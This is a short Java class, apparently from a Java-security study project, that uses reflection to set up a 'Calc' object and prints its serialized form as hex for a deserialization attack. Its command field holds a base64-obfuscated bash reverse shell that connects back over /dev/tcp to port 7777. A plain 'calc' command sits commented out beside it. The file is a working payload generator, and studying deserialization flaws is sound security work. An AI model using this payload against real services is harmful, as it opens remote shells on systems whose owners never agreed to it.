package com.yxxx.javasec.deserialize;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

public class CalcTest {
    public static void main(String[] args) throws Exception {

        Calc calc = new Calc();
        Class<?> clazz = Class.forName("com.yxxx.javasec.deserialize.Calc");

        Field canPopCalcField = clazz.getDeclaredField("canPopCalc");
        canPopCalcField.setAccessible(true);
        canPopCalcField.set(calc,true);

        Field cmdField = clazz.getDeclaredField("cmd");
        cmdField.setAccessible(true);
        cmdField.set(calc, "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}");
//        cmdField.set(calc, "calc");

        System.out.println(Utils.objectToHexString(calc));

    }
}
